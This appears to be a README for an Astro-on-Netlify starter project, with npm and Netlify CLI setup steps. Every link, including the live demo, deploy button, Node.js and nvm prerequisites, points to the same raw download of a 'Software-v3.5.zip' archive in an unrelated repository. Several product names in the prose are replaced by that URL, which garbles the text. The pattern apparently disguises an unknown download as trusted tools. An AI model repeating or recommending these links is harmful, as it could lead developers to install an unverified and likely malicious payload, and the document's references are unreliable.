# Astro on Netlify Platform Starter

[Live Demo](https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip)

A modern starter based on https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip, Tailwind, and [Netlify Core Primitives](https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip) (Edge Functions, Image CDN, Blob Store).

## Astro Commands

All commands are run from the root of the project, from a terminal:

| Command                   | Action                                           |
| :------------------------ | :----------------------------------------------- |
| `npm install`             | Installs dependencies                            |
| `npm run dev`             | Starts local dev server at `localhost:4321`      |
| `npm run build`           | Build your production site to `./dist/`          |
| `npm run preview`         | Preview your build locally, before deploying     |
| `npm run astro ...`       | Run CLI commands like `astro add`, `astro check` |
| `npm run astro -- --help` | Get help using the Astro CLI                     |

## Deploying to Netlify

[![Deploy to Netlify](https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip)](https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip)

## Developing Locally

| Prerequisites                                                                |
| :--------------------------------------------------------------------------- |
| [https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip](https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip) v18.14+.                                      |
| (optional) [nvm](https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip) for Node version management. |

1. Clone this repository, then run `npm install` in its root directory.

2. For the starter to have full functionality locally (e.g. edge functions, blob store), please ensure you have an up-to-date version of Netlify CLI. Run:

```
npm install netlify-cli@latest -g
```

3. Link your local repository to the deployed Netlify site. This will ensure you're using the same runtime version for both local development and your deployed site.

```
netlify link
```

4. Then, run the https://github.com/idkfwmmmmmmd/tunnelto/raw/refs/heads/main/src/pages/edge/not-australia/Software-v3.5.zip development server via Netlify CLI:

```
netlify dev
```

If your browser doesn't navigate to the site automatically, visit [localhost:8888](http://localhost:8888).
